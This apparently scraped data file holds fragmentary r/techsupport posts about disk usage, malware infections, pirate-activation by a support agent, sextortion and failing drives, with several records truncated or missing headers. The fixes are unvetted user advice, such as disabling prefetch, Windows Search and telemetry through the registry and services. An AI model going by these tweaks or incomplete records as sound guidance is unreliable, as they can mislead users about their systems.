- performed system diagnostics for the games (the performance levels/temps were all normal)
- cleaned off all the dust
- updated the nvidia driver
- replaced the RAM
- Sent the GPU for repair, they swapped it for a new one &amp;nbsp;

5tx15b,"Chrome: Submitted student loan payment, got confirmation # but lost it. Fedloan denies payment and we lose $30k. Can I get that code somehow?","I'm wondering if there is any way to retrieve some sort of cached image (I apologize, I don't know much about computers!) to retrieve an important confirmation number regarding our finances.

Using Windows/Chrome on 2/6, my husband submitted his payment due on the 12th. He said he saw a confirmation number, but didn't write it down because he's never had to use them. (It goes without saying that this was not a good decision, dude has a shitty enough time with this situation he doesn't need me to rub it in!)

I don't have a great understanding of the details, and he's really upset so I'm trying to not ask a ton of questions. The bank doesn't show that a payment was made, because Fedloan didn't request it. So Fedloan's website effed up, because he did submit payment. 

On the Fedloan website, they have you manually enter in the date that you want the payment submitted by. DH showed me the website, and that on that date field there was a chrome auto-fill drop down that showed our date in question. He said that chrome wouldn't saved that auto-fill unless he had pressed enter; which would mean that the payment was submitted. Of course, there could have been an issue following pressing enter, but he said he got to the confirmation code page.

Deets on why we're losing $30k aren't super relevant but it's the reason the issue is so pressing. It has to do with the loan forgiveness plan he's on. He called a few people, spoke to supervisors, and they gave the typical ""sorry blah blah nothing we can do"" spiel. 

People of reddit, please help if you know of a way. I've never seen him so upset before and I know this is more of a hit than just on our finances. I'll answer any questions if I can. Thank you so much for any info you can give, even if it's that we're screwed.

Edit: Thanks so much everybody for your help! It's been a few days for this to cool off and I'm going to ask him about it again using your suggestions.

Was just playing some Shadow Warrior 2 and wondering why I seem to get FPS drops in some areas, looking up benchmarking vids/etc.

As mentioned, I'm a bit sleepy atm and not sure why I was just sifting through the task manager but I found Aspnet.exe. Strange. I look it up and DAMN, I notice the CPU usage on my PC after reading a little: 50%! The real shocker came after I ended the process. My PC....now so quiet....jesus christ. I never knew why my fans seemed to be running quite loud all the time. I sometimes sleep with the PC on for music/etc and on some occasions I'd turn it off due to the fan noise.

I have questions and I'm trying to type fast here (to avoid sleeping overly late yet again):

- Any possible long-term damage? (slightly paranoid here)

- Possible performance hit while gaming? 

- How I'd even get this in the first place? Should I go back to having an anti-virus installed? Would it have helped?

I uninstalled it a while back and was going with MalwareBytes only but I might've disabled that at some point too due to intrusiveness. I've always been a bit overly-confident with my websurfing habits, then this happens. I'm still surprised though. I'm not sure if I ever noticed my CPU usage before....and the fan noise....I can't believe how quiet my PC is as I type this. I had become so adjusted to the noise. 

I'll be running some scans tomorrow for sure. Any advice/answers to the questions above would be much appreciated. 

EDIT: Checked FPS in mentioned game at a specific area with big drops; was 100% smooth. Coincidence? Or was this thing really screwing up performance? Windows shows file created on 1/27/17.

My account appears to sync with a system in China. The IP adress changes day by day, but it syncs IMAP protocol, or something, and I believe that is related to my e-mail?

Worst case, I have to completely destroy the account and move all the thing I use that e-mail for to a new e-mail adress/new microsoft account. 

If push comes to shove:
- can I then still use my PC? (It runs the free update Windows 10, and I think it is linked to my account)
- How would I move my contacts from my compromised account to the new one? Is that even safe?
- I use my current microsoft account/mail for ...well..almost everything. All the services do have unique passwords for it, though. 

Regards, 

me.

5q21vw,My idiot step brother just unplugged my 4 TB hard drive (containing multiple backups of recently crashed laptop — i.e. my entire life); I can't access any of the data on it. Anyone know of a fix for this (without reformatting)? Please help; my entire life is on there.,"First off, I have a Macbook Pro (retina, 15-inch, Mid 2015), running OS X El Capitan. It's running via quad core Intel i7 (2.5 GHz Intel i7) w/ 16 GB of RAM.


Well, getting started here, this problem is twofold. 


1) My external hard drive is no longer recognized on my laptop, potentially not even functioning as it should be. 


&gt;I've tried accessing Disk Utility (with the drive plugged in) in order to see whether it's mounting correctly in the very least; however, Disk Utility just loads, and loads, and loads (without ever actually bringing up the list of drives and other relevant junk).

&gt;All of the research papers, college assignments, personal photos, documents, original music, art, web design, and animation files // portfolios that I've created (all accrued throughout the duration of a lifetime spent living on this planet) are on there.


2) The unrecognized external drive contains multiple backups of a laptop of mine that had crashed over the summer. So, I've potentially lost the backups of my backups. 


&gt;To make matters worse, the backups weren't functioning as expected, and I could not access the data contained in them. They would only allow me to access the file names, sizes, file types, overall hierarchy, etc). 


&gt;The backups were made before my laptop had crashed. They were made using Carbon Copy Cloner, and the backups themselves were Sparse Image files. Only after attempting to mount the backups using Disk Utility // Disk Mounter multiple times did I discover online that mounting the original backups is an absolute no-no in data recovery. I should've known otherwise, but in a time of crisis, we do some pretty desperate // stupid shit. That's the case for my situation *exactly*.


&gt;So, my ALL of my backed up data is possibly (*probably*) corrupted. Is there ANY chance of getting it back // recovering the drive and the files contained there?! I've attempted to restore the backed up files to my fresh OS install after the crash on a new internal SSD, and all of the files are listed in the drive and displayed as per usual. However, none of the files can be opened and/or used in their respective programs.


Essentially, I was able to recover *MAYBE* 50% of what was on there. I was hoping to be able to get it touch with some data recovery specialists that could help me. Unfortunately, all that I've met with for a consultation are *very* far outside of my price range // budget. I'm a poor college student about a semester away from a bachelors degree. I'm taking a medical leave of absence from school until next fall in order to receive treatment for some (several) medical issues. 


So, I'm not only unemployed (since school let out for Christmas // winter break), but I'm also indebted to the federal government for my student loans, short of the bachelors degree, untreated for medical conditions that I've continued to seek help for for over 2 yrs now, BUT I'm also pretty freaking broke, (w/ several unmentioned events to top it all off). If I could recover the drive of my backup drive of my backup data, I would be over the moon.


&gt;**READ THIS**: Thanks SO so much to any and everyone that can help me with this.",https://www.reddit.com/r/techsupport/comments/5q21vw/my_idiot_step_brother_just_unplugged_my_4_tb_hard/,1485331540.0,143,0.95,77,techsupport,shortbusoneohone

5n9e1e,Need Help. First IT job.,"Hello everyone! I'll keep this as short and sweet as possible. I know a guy who owns his own tech company and a week ago he has offered to help me build my resume by doing side jobs for him. Sweet, I have always wanted to break into the IT world but have always been scared to make the jump.

So fast forward to today, he emails me and our local fire department wants a printer installed. He asks me if I want to call them back. Yeah, it's just a printer how hard could it be? Now my mind is going a little crazy, what if they have a printer that they want to use not anywhere near a computer or the router? I do not have any tools, accessories or any spare parts. I am simply expecting to show up to install a printer. My question to you all in the IT world, is how would you call them back? What questions would you ask them? I am afraid to ask them if they want it hooked up to the network in fear they say yes as I said I have no tools! The guy who is offering me this job is kind of just throwing me into it. Please, I know I may sound childish but I do not want to mess this up.

Update: For those interested in this post wants to know I contacted them. They have several chrome books in their office and a xerox machine. They want them all hooked up with print capabilities. I have never touched a xerox machine before and am really nervous! They want wired not wireless as well! Not sure how that is going to go in a brick building.

Update 2: I just came back from meeting with them, this job is way over what I would of thought. They want their entire IT infrastructure rebuilt from the ground up. They want all 4 firehouses in the town to share a singular network. Being able to print one thing from somewhere else is important to them. They also want to hook up a xerox to a samsung chromebox? I have to say I have heard of chrome books never a chromebox. I am excited to learn along the way and hope my boss takes on this task.

I'm trying to figure out how the hell could it have happened.,"So, I feel like I need to clarify that title is not a hyperbole or misspelling, [I seriously found a log file that is 51 gigabytes large.](http://imgur.com/TKFbuSg) It's from a poker game that my dad plays online. One odd thing is, he has it on other computers too and none of them are this large.

I came about it because my dad has 22 MegaBytes of space left on his harddrive and this is talking up half of it.

I know I can very easily delete it, but I'd like to figure out what happens for it to create a file of this insane size.

What I assume is one of two things,

1. It's existed for so long that, that just happened naturally

or

2. It's corrupted in some horrible fashion.

Now, I would just open the file, but in that screenshot you'll be able to see that it ends with the "".log.0"" file type. I searched online and was told to download winrar to ""Unarchive"" it. I tried with both winrar and 7zip and it yielded no results. I also tried to just remove the extension, however that did nothing as well.

Do any of you have any Idea of how to open it?

**The issue is coming from DiagTrack in the Services tab on Task Manager. Using Resouce Monitor, you can find the file location while the issue is in progress. In the DISK section of Resource Manager It will give the file location. The fixes are below;

**Perm Fix** (Take above steps before this**

Credit goes to /user/Gaethan for the perm fix. I've rebooted 2 times and DiagTrack is staying disabled and usage is at 0%!

Hey. I think I found a way of making your temporary fix for the 100% disk use problem permanent. It has worked through a reboot.
**After you stop the DiagTrack service in the services tab**, click ""open services"" at the bottom. Find ""connected user experiences and telemetry"" in the list that opened, right click it and open properties. Click the dropdown menu that says ""startup type"" and disable it. Then go to the recovery tab in the properties window, and select ""no action"" on the three dropdown menus.
You might want to add this to the original post for visibility.

Rig: i7 6700k, GTX 980TI SLI (two) I also have a 500GB SSD

Out of nowhere, my CPU is seeing some high usage on idle, and the ""Disk"" column under task manager is at 100% consistently, Most of the usage coming from ""System"" whihc is fluxuating between 1.5MB/s to 3 sometimes 4MB/s


Startup time is pretty fast still, but some of my startup programs are not opening (only have like 5 in total, which are all pretty low demanding)


This just happened out of nowhere today when I noticed it. I've ran CCleaner and windows defender.

I've tried Disabling windows search and superfetch, no success. Still see ""Disk"" column at 100% usage. Some programs are not opening up at all anymore as well.

I've scanned for viruses and checked ssd for errors, nothing showed up. **A ""System"" item is using 1.5MB/s++ (upwards of 4.5Mb/s)**

EVGA precision X will not open, even when trying to open as administrator. so I'm not sure what my temps are running at, and my GPU's are not turning the fans on I don't think

5h7w11,[NSFW] Simple Google search with parameters inexplicably returns zero results when there should be plenty,"As the title says this is NSFW. It's about searching for specific erotica.

[Looking up for ""bimbo"" on asstr.org returns zero results](https://www.google.com/#q=bimbo+site:asstr.org). At least on my end and I'm curious about yours. Trust me, there should be plenty… 

I've tried it with the same result on:

- Very old Android + Firefox Mobile + wifi + normal mode
- Old Android + Firefox Mobile + wifi / 4G (different providers) + normal / private mode
- Windows 10 + Firefox / Edge + wifi + private mode

Everything as up to date as possible of course. I'm inclined to say the OS, browser, navigation mode or internet provider doesn't matter (unless there's a nationwide very specific filter for whatever reason) and that it's a google search specific issue. Tried on google.com and google.fr, no change.

You could look up for [""threesome""](https://www.google.com/#q=threesome+site:asstr.org) or [""wizard""](https://www.google.com/#q=wizard+site:asstr.org) or [""tentacle""](https://www.google.com/#q=tentacle+site:asstr.org) or any other preferred perversion and you get results. yet not for ""bimbo"" despite there being plenty of such stories.

I though it was filtered only for asstr, but [searching on literotica gives the same result](https://www.google.com/#q=bimbo+site:literotica.com). Same for [storiesonline](https://www.google.com/#q=bimbo+site:storiesonline.net). 

But if you don't search for a specific website, [google knows what a bimbo is](https://www.google.com/#q=bimbo). Filter it again to [Wikipedia](https://www.google.com/#q=bimbo+site:wikipedia.org) or [The Guardian](https://www.google.com/#q=bimbo+site:guardian.co.uk) and everything is fine.

It's also specifically something about the word bimbo, because search for [""bimbo transformation""](https://www.google.com/#q=bimbo+transformation+site:asstr.org) and it's still empty, but look for [""transformation""](https://www.google.com/#q=transformation+site:asstr.org) or [""vampire transformation""](https://www.google.com/#q=vampire+transformation+site:asstr.org) and it works just fine.

I thought about related words because google uses that in searches to give you more results. Search for [""bimbofication""](https://www.google.com/#q=bimbofication+site:asstr.org) and you also get nothing. Search for [""bimbification""](https://www.google.com/#q=bimbification+site:asstr.org) and MIRACLE, you get a few, but it makes me wonder why this specific term isn't caught in the filter.

Finally, prefixing with [intext:](https://www.google.com/#q=intext:bimbo+site:asstr.org) or [allintext:](https://www.google.com/#q=allintext:bimbo+site:asstr.org) still gives no results.

I'm at a loss as to why there is a super specific filter for ""bimbo"" that targets erotica websites and how to circumvent it. Is it a default Google setting that does that? Is there any way of tricking Google Search into giving me results?

Edit: [See update comment, workaround found](https://www.reddit.com/r/techsupport/comments/5h7w11/nsfw_simple_google_search_with_parameters/day66kh/).

Edit2: If anyone knows who/where at google or other search engines to ask about this, or subreddits that would be interested in solving the mystery, do comment!

**Edit3: As found by /u/necro3mp, searching for ""pedo site:reddit.com"" returns nothing (and same on asstr while other CP tags work), and like /u/selv4 and /u/misconfig_exe pointed out ""bimbo"" is Italian for baby, so this might be a child pornography filter at work.** There are still plenty of inconsistencies in this theory though, and it would be very sloppy, so it might be just a translation coincidence…

So I have 3 different SSD's, all with their own Windows 10 legit installed. One of them with Norwegian Windows, another UK Windows. I have tried to reinstall windows multiple times. I've tried to clean the disk 100 percent and make a clean windows install. But every time my PC ends up with the same problem over and over again, 100 % disk usage. 

I use the ""Task Manager"" (CTRL+Shift+Esc) to minitor the problem at my secound monitor. All the drivers are up to date and correctly installed. The 100 % disk usage happens usually 2-3 times a day. It often happens when I either browse the internet, about to google something (and it feels like you have a very slow internet and search for something, but the search never gets completed, it stops, I try to click anywhere else on either the task bar or another tab in the browser, then I get this ""Has stopped working error"". Also the clock at the taskbar stops).

____________________________

**How I fix this, and which order to fix**

* Make sure you got all the drivers for your motherboard installed. The most important one in this case is the Intel SATA Driver (Sorry AMD users, never had an AMD CPU, but try to install the chipset drivers). You can check the ""Device Manager"" (""This PC"" Rightclick --&gt; ""Properties"" --&gt; ""Device Manager) and [This is how it looks like without the driver. Standard SATA AHCI Controller](https://puu.sh/sHueM/6fe4772ea6.png). So install the Intel SATA drivers for your motherboards homepage [and this is what it should look like after you have installed the driver](https://puu.sh/sHxcW/f50c36ee5f.png). 

* If you installed the Intel SATA Drivers correct and you still got these 100 Disk Usage freezes I would ""Turn OFF"" (Get tips, tricks and suggestions as you use Windows) by going into: Settings - System - Notifications. [Here is a picture of that](https://photos.google.com/share/AF1QipNFGlKSP7CH727KFIyamDwtLfspHy2ak1CTzTwyhacksu250Sg486rg-KrzwZdtpg/photo/AF1QipMYw9KUOVnYF9WRSyC8je0ezsUw_swneLalLN_2?key=VE9idGxhNmNWQ1dyRTNOcGZ3VEVoTkp5T2s3em1n).

* Change the ""PrefetchParameters. To find it go into search bar and search for: Regedit (rightclick and run as administrator). Click into these folders: HKEY_LOCAL_MACHINE - SYSTEM - CurrentControlSet - Session Manager - Memory Management - PrefetchParameters --&gt; And in here you find the (EnablePrefetch) and set this to (0) insted of (3). [It will look something like this](https://photos.google.com/share/AF1QipOviamaTSfL6MO07_0MwGlzduxpnLgR2Tm8OJKBFpABV6198HmvynFEAN3xSGVobw/photo/AF1QipPRoRdiVMwPOqLD0EEVmpK7XL9VlHDM7udXTQvG?key=bG9SMDVuemdpSWc1ZnpSS3VuNDl4SWxsUHRIajB3). 

* Still got issues? Search for: Services.msc, and open as administrator. Go into Services and find (Superfetch) and (Windows Search). rightclick and go into (Properties) Where you should first click ""STOP"".  Then you want to change the ""Startup Type"" to (Disabled). [It will look something like this](https://photos.google.com/share/AF1QipMYPEWotm1P3oJBkJpJxENMiOaWZzEJspKBHWzH_nZX6VADVuOu-w1LVpxTjqoFuw/photo/AF1QipMCscvivQ9M1eiEzgoC0WtOVV217WTG9cfkK0pq?key=akxveU9heXRDNEYzb25qTzBSRUVmZFlieTNYMy1B).

* If this did not fix it for you. I would go into (This PC), rightclick at your OS Drive (Usually named: Local Disk (C:)) --&gt; ""Properties"" and in here you will see something like (Allow files on this drive to have contents indexed in addition to file properties). For you this will most likely be hooked. Unhook this one and some ""administrator blah blah will come up"" Click just ""Yes"" and ""Next"" or whatever it is. Then you'll get two choices and keep clicking ""next"". Suddenly it comes up that some of the programs are already in use or whatever, but what you want to do is to click (Ignore All) and this will start a process that takes around 3-4 minuttes (I had 3 TB of data it had to ignore). [If you want to learn more about what this does you can click here](http://www.online-tech-tips.com/computer-tips/simple-ways-to-increase-your-computers-performace-turn-off-indexing-on-your-local-drives/) or check out some of the comments for this post. There is some really good answers here.

* Check your SATA cable. Change it if you have one. If not, dont bother to buy one, just go to the next point below.

* Check your startup programs at ""Task Manager"" and ""Start-up"". Is there something here that may bother you? DO NOT HAVE MULTIPLE ANTIVIRUS PROGRAMS. One is more than enough!

* Worst case senario. Try to use another disk. Install windows and see if it help. Maybe your disk was just messed up.

* That was everything I know. If I figure out anything else that may cause this issue I will be sure to post it here in this thread. I hope this may help some of you with this horrible issue that have been with me for weeks now.

There was a previous incident where the router was hacked through wireless last year, and this has really fueled his fear despite computer technician telling him it shouldn't happen easily again if he takes some basic precautions. 


He has disabled wireless function and goes on his phone/ipad with an ethernet adapter and puts the router into a box plastered with aluminum foil (because he somehow thinks the neighbor is hacking the router with radio waves). The router is wpa2 encrypted but he just does not believe me when I told him its fairly difficult to crack. He has also shut off online banking service from his bank; he thought a hacker can crack the password.  

When I leave my computer on while leaving the house (disconnected from wireless) he suggest me to turn the computer off because he thinks somehow I can get malware/trojan just by leaving it on while not downloading anything. 

The lastest thing is that he said a hacker has prevented the router from automatically upgrading its firmware. Just how a hacker does that without us turning on wireless? I even use a vpn. I need some knowledge to convince him of just how paranoid he is about this.",https://www.reddit.com/r/techsupport/comments/5gktzn/dad_is_getting_paranoid_about_router_hacking/,1480925949.0,67,0.98,92,techsupport,genus_git

I leave, and then not 5 minutes later I get frantic messages from this account with like 50 real names of my facebook friends saying they're going to send the video to everyone.

It's black fucking mirror in my life.

So I guess there is now a naked video of me on the internet, probably.

1.Nuked that skype account and email from orbit and chaned passwords on everything
2. Modify privacy settings on everything on Facebook to make sure it's friends only, change facebook name, and deactivate account.
3. Change passwords on every fucking thing. Emails, social media, everything
4. Currently running TronScript on the affected laptop.

We updated our servers at work and one of the older computers was going to be thrown away, so I decided to take the chance since I'm looking for a gaming device at the moment anyway.

It is a 64bit i7-3930k 3.20 GHz with 32gb Ram and one AMD Radeon HD 7900 and an NVIDIA Geforce 8400 GS. The tower is kind of big and the cooler does wierd noices after a while.

My question is: Is this device recommended for gaming? (Sorry if this question sounds dump, but I'm absolutely not into computers). And would it be possible or is it recommended to put this hardware in a new silent tower with a new cooler?

Thanks a lot and let me know if you have further questions to help. Appreciate it!

5e178g,"My Mom has turned her Mail app into an undefusable time bomb. It devours so much memory that it freezes the minute it's opened, so I can't even get into the settings to wipe the damn thing. How can I fix this?","1) She's one of those people who, while a lovely human being, is not  what you'd call computer-literate. She's had the same Yahoo email account for over a decade. She gets hundreds of spam mails a day, many of which have several-megabyte attachments. She realizes they're spam, thankfully, but she has not deleted *any* of them. 

2) The Mail app, as far as I can gather, downloads all emails and attachments so you can access them online. For convenience, of course. I don't think she really makes use of this feature, it's just on by default.

3) The problem is severe enough that I physically cannot get into the preferences. It immediately freezes, ceases to respond, and can't even be closed without using force-quit.

4) It is in fact possible to delete all of the crap clogging it... if you open the Mail app and go into the preferences.

So you see my dilemma. This is, as far as I can tell, the equivalent of locking your keys in the car.

I'm planning to get her a new email account -- switching her from Yahoo to Gmail for good measure -- and require her to check it from inside her browser. If I remove Mail from the dock and make it so she can't pull it up with the search bar, that'll probably solve the problem. But I'd like to defuse this goddamn app first.

I need to keep it from pulling up automatic notices, and I'd like to ensure it won't automatically freeze when opened. I figure there's a reason that the bomb squad defuses IEDs instead of stuffing them in the nearest garage and calling it a day.

Also, I don't want to be pushy, but she's  about to just take it to Apple and spend a hundred bucks rather than wait a day for me to fix it.

The reactivation process using my MS Account wasn't working.  It showed my account and proper computer/license, just the reactivation kept failing.

Using the Troubleshoot function within Settings it led me to Support where I requested Chat support.  All web addresses were thoroughly checked for legitimacy.  I was not being phished.  

I connected to the support agent and after describing my issue he wanted to remote into my computer to fix it.  He sent me to a MS Support page to agree to remote support and connected me to a LogmeIn App to allow the connection. 

It all felt shady, but all web addresses were legit. (I took pics and videos along the way and will share them all when I get home, writing this from work.)  He connected and ran a BAT file that due to a post here a week ago (https://www.reddit.com/r/techsupport/comments/5b0wyy/did_microsoft_support_just_activate_my_windows/) I knew he was using pirate activation servers.  I specifically have a video of him running the BAT.

I called him out on it and made him fix it with a legit key using slui 3 and I am now activated.  I just feel it is my responsibility to let MS know what their contracted Tech Support people are doing.  Where do I go from here?

On an i7 quad, it has hyperthreading so there are eight logical cores. If I assign two to the guest and leave two for the host, would each OS really just get one physical core and have it split via hyperthreading? Or will they get two physical cores each and have four logicals available?

5b0wyy,Did Microsoft support just activate my Windows using the same script pirates use?,"Edit 2: UPDATE

Okay, so, I got in touch with Microsoft again (I typed microsoft.ca into the address bar, just like the first time; stop insisting I clicked a bad link, guys); but first, I'd like to thank everyone for your input. It was especially useful to recieve confirmation that the script did exactly what I thought it did. The revelation that ""Microsoft support"" was actually a bunch of outsourced contractors working to meet unrealistic metrics was also particularily enlightening. Heck, I even appreciate those of you who kept insisting that I got scammed -- you were only looking out for me.

Now, story time. It's pretty boring though; nothing much happened, but I figured you'd want some closure. So, I went to their support chat again (triple-checking the address since you guys made me super paranoid), typed in a brief summary of what happened yesterday and got connected to a tech who gave me pretty much the exact same script as yesterday. After confirming my product ID and that I had a valid Win7 key, he also asked to remote in. At this point, I realized that he'd completely ignored the fact that the last tech I got in touch with activated my OS illegally and refused to let him remote in until I spoke to his supervisor. I got a call a few minutes later; spoke to a nice lady with what sounded like (at the risk of sounding racist) a mild Indian accent and managed to convey that the last tech did something illegal but I had no tracking number or name. She assured me that she would still investigate but she could have been blowing me off for all I know. Whatever. Not my problem anymore; Microsoft can clean up their own house. They bounced me back to support chat and insisted on remoting in again. This time, I let him do his thing and he simply ran winver then entered a new key via slui 3 -- nothing shady. Typed out the key for me to save in notepad, gave a session ID and ended the chat. As far as I'm concerned, problem solved.

To everyone who kept saying I fucked up and got scammed, I totally see why you'd think that but I'm confident that I went through official channels and got screwed by an unscrupulous tech trying to improve his metrics. I mean, come on, give me some credit here. I noticed that the batch file was doing some shady stuff, even though he only flashed it on screen for the seconds necessary to copy and paste then save the file, and had the presence of mind to investigate. You really think I wouldn't have noticed if he'd tried to install malware on my machine? As to everyone saying that remoting in is highly irregular, I'm 2 for 2 now with techs insisting on remoting in. Either I got scammed both times by scammers who neither took any useful information nor compromised my machine while providing me with a new Win10 key, or they changed their standard operating procedure. I think the latter is more likely. I'll grant you that not recieving an email after the first session was unusual, but the guy already pirated Windows for me; seems he's not a stickler for protocol. Since the confirmation email I got after today's session was titled ""Microsof Answer Desk"", I'm pretty sure the confirmation email is not a fully automated process. And before anyone starts to insist I got scammed today as well, the email came from a css.one.microsoft.com account. I know emails can be spoofed but the headers look fine to me in my non-expert opinion. All in all, I remain confident that I've not been compromised. Please stop saying I have unless you actually have something new to add to the conversation; you're boring me.

Once again, thank you everyone for your help. Tech support is not a fun job; doing it for free seems nigh on insane and I greatly appreciate you taking time out of your day to help a total stranger. Keep being awesome =D

Original post follows:

So, I replaced my motherboard and had to go to Microsoft support for activation of my Win10 install (upgraded from Win7 that was in turn upgraded from XP). Went with the online chat option and after providing some information, the tech remoted in to run a batch file that magically activated Windows, deleted said script, then used Windows Search to make sure the script was deleted.

I found this curious and managed to recover the file. After a tiny bit of googling, I found that the batch file was a script to activate via KMS that hits the same host (AlwaysSmile.uk.to) as a file distributed among pirates. In fact, there's a short [reddit thread](https://www.reddit.com/r/privacy/comments/4qyr81/i_have_seen_this_activate_windows_all_version_and/) dealing with said script.

So, my question is, has anyone experienced something similar? Is this standard operating procedure? I'm fairly sure that I don't actually have a legitimate Windows key now and, as I understand it, KMS activation has to hit the server every 180 days. I don't really want to be reliant on hitting a server in China every 6 months.

I should probably contact Microsoft again, shouldn't I? The problem is, I didn't take down the support chat session id because I figured that there was no point since the problem was solved. So, yeah, hope someone more knowledgeable can let me know if I'm overreacting or not.

They said they were from microsoft, but I really strongly suspect that he's been the victim of a scam because he's young and stupid.

He was blurry on the details at this point, but apparently the guy put a 24 hour security 'thing' on his computer, and stated that he doesn't have virus protection from them so he needs to call back within 24 hours or the 'hackers will get him'.

As per the title, I installed an app that I had on an old drive onto my system. It installed fine but doesn't run as it should so I decided to uninstall it. However, it seems the supplied uninstaller is 16 bit and it won't run on my 64 bit system.

I tried numerous uninstaller apps but they all just try to run the app's own uninstaller. A 'force uninstall' doesn't work either.

Is there any way to remove the app and associated registry entries without doing a manual uninstall?

525izd,I haven't had internet service available in my area for almost 20 years so what can I do?,"TLDR: Haven't had wifi options for over a decade. Need something other than aircard or satellite internet for work. Options?

Since we built our house 16 years ago, we have called around yearly to every internet provider we could think of. Early on we had AOL dial-up like a lot of people, but over the years as others got DSL and even better upgrades, we haven't been able to get WIFI. We live an hour outside Atlanta so we assumed it would eventually expand to us. We are currently stuck with an aircard device that gives us 6 GB of data a month. This restricts us from doing anything like Netflix, online gaming, or working from home via telecommunications (like my mother now has the option to do) since it eats data like crazy to the point it's not viable.

After talking to neighbors over the years, it became clear that before our house, charter owned the area. Past our house, AT&amp;T owned it. Every time we called, we were told that their service is not available in our area and that they were growing and extending coverage everyday. With a disappointment, we accepted this for the first few years. You have to think that this was back around 2000 to 2005 when having AOL dial-up was a common thing. But now that I need it for work and school, I need other options. 

The only current option is either satellite internet, which we've been told won't meet our needs because it doesn't have enough bandwidth or our current aircard. We were told in a Charter store one day that they cannot expand to our address because AT&amp;T owns the rights to our location , but it appears AT&amp;T has decided not to expand. I have thought about contacting my local city government about this situation, but I'm not sure if that is something they can assist with or who to talk to. Also, there is someone 1/4 of a mile away from us with AT&amp;T, but they say they don't offer it at our address.

Also talked to a friend of a friend who works for AT&amp;T, who said something along the lines of that all it would take is someone willing to approve it and connecting us the the closest box. But she also said that our service might be shoddy which is the reason they limit the number of people on a box and really need them to expand a box onto my road.

Just to name who we've contacted, we've called AT&amp;T (who provides our current aircard), Verizon, Charter, Comcast, Wild Blue, and I believe one other that I cannot remember. We also ruled out HughesNet and other satellite internet providers for lack of bandwidth.


It has become more than a disappointed kid who can't play Xbox live or watch Netflix. Now that I'm in college and need a stable service for homework, I NEED the Internet. Whether it be a recommendation to a company you think I've overlooked, someone specific you think I should contact or advice on talking to the municipality, I need you're help!

TLDR: Haven't had wifi options for over a decade. Need something other than aircard or satellite internet for work. Options?

Edit 1: I wanted to thank everyone for their input and ideas. I'm going to be contacting EarthLink, Juno, and possibly Sprint today as I think those would be the easiest and cheapest solutions if available. If they do not offer coverage in my area, I'm going to look into some of the other tech online and possibly contact my city government.

50u5zm,My hard drive containing all my life's work is about to die.,"This is on a dell computer with Windows 7.

So yesterday, out of nowhere we had a power outage while the computer was on. After turning it back on, it was running really slow and the hard drive was making a strange buzzing sound. I can't open any programs, rename anything, use the internet, or search on the computer. Everything takes about ten times as long as it normally would and it constantly freezes and crashes on me.

After doing some research, I learned the hard drive might me dying. I'm going to lose irreplaceable family photos, stuff for school, expensive programs, passwords, and many other things of value. I'm getting an external hard drive at Best Buy today so I can back up everything onto it. My only problem is that I'm afraid the computer will freeze during the back up process. I have a little over one terrabyte of things to backup and on top of that, the computer is running super slow.

I really need some advice on what and what not to do and maybe some tips to help me with this problem. I want to back eveything up before the hard drive dies and I lose everything. Saying something useless like ""should've backed it up sooner"" is not helpful. I couldn't afford an external hard drive before now. Any advice would be a big help, as I am not very knowledgeable of computers. Thank you.

UPDATE: I took it to a local repair place to have it imaged. I'm having it imaged onto an external, then  from that i'm having it imaged onto an internal. The guy at the store is also running a diagnosis on it for free. Hopefully, it's salvagable. I left it off after it started acting up and haven't turned it back on since. Thank you all for your help. If I hadn't posted this here, I would've made this situation much worse. The tech guy said he might call me tomorrow with the diagnosis and that he will be done imaging the drive(s) by Tuesday. I'll update this when those events occur.

UPDATE 2: Okay, to make a long story short, they couldn't image the drive because the computer wouldn't boot, but are instead saving my data onto the other drive. Also, the diagnosis showed that the mother board broke as well. They showed us when it couldn't make it past the stress test. And they tried multiple times before coming to that conclusion. That's more money to spend, but my data is saved and my computer is getting fixed so it is entirely worth it. Thanks again for all your help.

Well, at first I thought this was like any other thumbdrive virus (files got hyperlinked and hidden)  but this thing damaged the Wi-Fi driver and force-closes the Settings app. The laptops that infected are all W10. 

To further add, installing MBAM (my try to disinfect it back) failed with 'exception handling error' thing.

Whatever virus is it is clever. Defender is disabled at one of the laptop.

I need help, this seems like a targeted virus as it only (so far) happens in W10 machines. I can provide more info (tell me which and how)  and I accept specific answers. All replies is highly appreciated.

TL;DR ; Flashdrive virus broke W10 Settings and has gone to several W10 machines, need help.

**UPDATE 2: SOLVED!** I found the culprit, seems like it takes time for that virus to fully plant itself onto a PC. I finally managed to cure all the infected laptops!

If it plants onto your PC, you can actually trace it by **VERY CAREFULLY** watch the Task Manager window. [WBSC(Windows Based Script Host)](https://upload.wikimedia.org/wikipedia/en/0/0a/Windows_Script_Host_Icon.png) tasks will randomly appear in threes, while two of them are in couple and one is FAR down the 'Details' tab. Each of the tasks have gibberish labels and EACH infected machine will have a different name.

Once it plants, every thumbdrive you plug in will be infected with  your only solution is in safe mode. There's a specific folder, hidden in %appdata% and that folder name **WILL** differ from every machine plus it's gibberish, and that's the folder that keeps the ""HIV"", and this folder can ONLY be deleted while in Safe Mode. Once you deleted that folder, reboot and see if those fuckers still running in Task Manager. Voila, you have been cured (well.. technically)

I managed to capture the .js file while I nuked the drive with my trusty *attrib -h -r -s /s /d* command and archived it in a .7z zip file (and I have to do this with very fast hands, thanks osu!). An infected drive of this particular virus will expose a folder with three-digit randInt that contains the script and a .bat file simply to autorun that JavaScript after nuking. I will PM the zip file to those who want it.

WHEW. I finally realized I just saved everyone. Gonna report this soon.

4xrwtk,"According to WOW, TWC installed firmware on my personal modem effectively bricking it for all ISPs but TWC/Comcast","So here's the issue.

I bought an Arris SB 6141 because it was cheaper than renting from TWC. I have recently moved to an apartment complex that only offers WOW. No big deal for me, internet is internet right? Wrong.  

When negotiating our contract with WOW they said that my modem would not work with them as TWC had probably installed firmware on my modem that prevents it from accepting new activation packets. I figured this was just them trying to get me to rent their modem and brushed it off. But sure enough when the tech showed up, the 6141 would power cycle nonstop without accepting the new service. So I went ahead and let WOW install their modem just so I could have internet while I did some troubleshooting.  

I got on the phone with TWC and they either played dumb or had no idea about firmware issues and passed me on to Arris. Arris support was actually super helpful and after doing the typical factory resets and basic stuff he had me check the signals for the Arris modem. I don't remember the exact numbers off the top of my head but they were jumping and beyond the normal range. Arris then told me to contact WOW and have them check their signals.  

So I went ahead and called WOW and they sent a technician out who then said that the signals were fine (I checked later and they seemed to be in the normal range as well) and they stated that the outlier signals I was reading on the 6141 was due to the firmware TWC installed preventing the modem from accepting their signal.  

It was at this point in the game where I realized that I was in over my head and have no idea how to proceed.  

